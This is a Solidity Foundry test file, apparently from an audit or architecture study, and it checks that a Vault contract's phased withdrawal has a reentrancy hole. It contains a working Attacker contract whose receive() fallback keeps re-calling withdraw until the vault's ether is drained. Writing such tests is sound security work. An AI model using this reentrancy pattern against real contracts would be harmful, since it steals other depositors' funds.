// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/_arch-ax02-02-evm_project.sol";

contract Attacker {
    Vault internal vault;

    function attack(Vault v) external payable {
        vault = v;
        vault.deposit{value: msg.value}();
        vault.withdraw(uint128(msg.value));
    }

    receive() external payable {
        uint256 bal = address(vault).balance;
        if (bal > 0) {
            uint128 slice = bal > msg.value ? uint128(msg.value) : uint128(bal);
            if (slice > 0) {
                vault.withdraw(slice);
            }
        }
    }
}

/// T-ARCH-035 / H-AX-02-02: phased raw transfer exposes a reentrancy window on EVM.
contract Ax02PhasedReentrancyTest is Test {
    CambrianFactory internal factory;

    function test_arch_ax02_02_phasedReentrancyDrains() public {
        factory = new CambrianFactory();
        Vault v = Vault(address(factory.deployVault(1)));
        vm.deal(address(this), 6 ether);
        v.deposit{value: 5 ether}();

        Attacker atk = new Attacker();
        vm.deal(address(atk), 1 ether);
        atk.attack{value: 1 ether}(v);

        assertGt(
            address(atk).balance,
            1 ether,
            "H-AX-02-02: phased pull/settle must allow reentrancy drain on EVM"
        );
    }
}
